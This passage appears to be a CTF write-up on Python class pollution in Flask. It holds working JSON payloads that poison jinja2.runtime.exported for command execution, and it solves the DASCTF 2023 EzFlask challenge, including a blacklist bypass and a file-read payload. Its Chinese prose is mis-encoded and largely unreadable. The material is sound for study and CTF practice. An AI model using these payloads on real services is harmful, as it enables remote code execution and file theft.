</h3><p>åœ¨<code>flask</code>ä¸­å¦‚ä½¿ç”¨<code>render_template</code>æ¸²æŸ“ä¸€ä¸ªæ¨¡æ¿å®é™…ä¸Šç»å†äº†å¤šä¸ªé˜¶æ®µçš„å¤„ç†ï¼Œå…¶ä¸­ä¸€ä¸ªé˜¶æ®µæ˜¯å¯¹æ¨¡æ¿ä¸­çš„<code>Jinja</code>è¯­æ³•è¿›è¡Œè§£æè½¬åŒ–ä¸º<code>AST</code>ï¼Œè€Œåœ¨è¯­æ³•æ ‘çš„æ ¹éƒ¨å³<code>Lib/site-packages/jinja2/compiler.py</code>ä¸­<code>CodeGenerator</code>ç±»çš„<code>visit_Template</code>æ–¹æ³•å­˜åœ¨ä¸€æ®µæœ‰è¶£çš„é€»è¾‘</p>
<p>è¯¥é€»è¾‘ä¼šå‘è¾“å‡ºæµå†™å…¥ä¸€æ®µæ‹¼æ¥çš„ä»£ç ï¼ˆè¾“å‡ºæµä¸­ä»£ç æœ€ç»ˆä¼šè¢«ç¼–è¯‘è¿›è€Œæ‰§è¡Œï¼‰ï¼Œæ³¨æ„å…¶ä¸­çš„<code>exported_names</code>å˜é‡ï¼Œè¯¥å˜é‡ä¸º<code>.runtime</code>æ¨¡å—ï¼ˆå³<code>Lib/site-packages/jinja2/runtime.py</code>ï¼‰ä¸­å¯¼å…¥çš„å˜é‡<code>exported</code>å’Œ<code>async_exported</code>ç»„åˆåå¾—åˆ°ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡æ±¡æŸ“<code>.runtime</code>æ¨¡å—ä¸­è¿™ä¸¤ä¸ªå˜é‡å®ç°RCEã€‚ç”±äºè¿™æ®µé€»è¾‘æ˜¯æ¨¡æ¿æ–‡ä»¶è§£æè¿‡ç¨‹ä¸­å¿…ç»çš„æ­¥éª¤ä¹‹ä¸€ï¼Œæ‰€ä»¥è¿™å°±æ„å‘³ç€åªè¦æ¸²æŸ“ä»»æ„çš„æ–‡ä»¶å‡èƒ½é€šè¿‡æ±¡æŸ“è¿™ä¸¤å±æ€§å®ç°RCEã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">#templates/index.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>nt here~<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>    
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#app.py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span><span class="p">,</span><span class="n">render_template</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">merge</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">),</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#static/
</span></span><span class="line"><span class="cl">#æ˜¯ä¸ªç©ºç›®å½•,æ–¹ä¾¿ç›´æ¥åˆ©ç”¨staticç›®å½•è¯»å–flag
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿›è¡Œ<code>RCE</code>å°†<code>flag</code>å†™å…¥<code>static</code>ç›®å½•ä¸­</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;__loader__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;__init__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;__globals__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                        <span class="s2">&#34;sys&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                            <span class="s2">&#34;modules&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                                <span class="s2">&#34;jinja2&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                                    <span class="s2">&#34;runtime&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                                        <span class="s2">&#34;exported&#34;</span><span class="p">:[</span>
</span></span><span class="line"><span class="cl">                                            <span class="s2">&#34;*;__import__(&#39;os&#39;).system(&#39;cp ./flag ./static/flag&#39;);#&#34;</span>
</span></span><span class="line"><span class="cl">                                        <span class="p">]</span>
</span></span><span class="line"><span class="cl">                                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                            <span class="p">}</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯éœ€è¦æ³¨æ„æ’å…¥<code>payload</code>çš„ä½ç½®æ˜¯ASTçš„æ ¹éƒ¨åˆ†ï¼Œæ˜¯ä½œä¸ºæ¨¡æ¿ç¼–è¯‘æ—¶çš„å¤„ç†ä»£ç çš„ä¸€éƒ¨åˆ†ï¼ŒåŒæ ·å—åˆ°æ¨¡æ¿ç¼“å­˜çš„å½±å“ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œæ’å…¥çš„<code>payload</code>åªä¼šåœ¨æ¨¡æ¿åœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶è§¦å‘</p>
<p>ç„¶åå°±èƒ½åœ¨<code>static</code>ç›®å½•ä¸‹è¯»å–åˆ°<code>flag</code>äº†</p>
<h2 id="ä¾‹é¢˜">ä¾‹é¢˜
</h2><h3 id="dasctf-2023--0x401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›ezflask">[DASCTF 2023 &amp; 0X401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›]EzFlask
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">session</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">secret</span> <span class="kn">import</span> <span class="n">black_list</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">black_list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">user</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">==</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">==</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Users</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/register&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">check</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;Register Failed&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;username&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">or</span> <span class="s2">&#34;password&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;Register Failed&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">User</span> <span class="o">=</span> <span class="n">user</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">User</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">Users</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">User</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;Register Failed&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Register Success&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Register Failed&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;username&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">or</span> <span class="s2">&#34;password&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;Login Failed&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">Users</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">user</span><span class="o">.</span><span class="n">check</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">session</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="s2">&#34;Login Success&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;Login Failed&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;Login Failed&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5010</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„mergeå‡½æ•°è·Ÿä¸Šé¢ä¸€æ¨¡ä¸€æ ·ï¼Œ<code>register</code>è·¯ç”±è°ƒç”¨äº†mergeå‡½æ•°ï¼Œæ ¹è·¯ç”±ä¸‹é¢å¯ä»¥è¯»æ–‡ä»¶</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    &#34;username&#34;:&#34;a&#34;,
</span></span><span class="line"><span class="cl">    &#34;password&#34;:&#34;b&#34;,
</span></span><span class="line"><span class="cl">    &#34;__class__&#34;:{
</span></span><span class="line"><span class="cl">        &#34;__init__&#34;:{
</span></span><span class="line"><span class="cl">            &#34;__globals__&#34;:{
</span></span><span class="line"><span class="cl">                &#34;__file__&#34; : &#34;/flag&#34;#å½“flagåœ¨æ ¹ç›®å½•ä¸‹ä»¥åŠflagæ–‡ä»¶åçŸ¥é“çš„æƒ…å†µä¸‹
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯æœ‰é»‘åå•ï¼Œå¯¼è‡´æ±¡æŸ“ä¸äº†ï¼ŒçŒœæµ‹è¿‡æ»¤äº†init</p>
<p>æˆ‘ä»¬ç”¨<code>check</code>å‡½æ•°æ¥è·å–<code>__globals</code>æ¥æ±¡æŸ“</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    &#34;username&#34;:&#34;a&#34;,
</span></span><span class="line"><span class="cl">    &#34;password&#34;:&#34;b&#34;,
</span></span><span class="line"><span class="cl">    &#34;__class__&#34;:{
</span></span><span class="line"><span class="cl">        &#34;check&#34;:{
</span></span><span class="line"><span class="cl">            &#34;__globals__&#34;:{
</span></span><span class="line"><span class="cl">                &#34;__file__&#34; : &#34;/flag&#34;
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
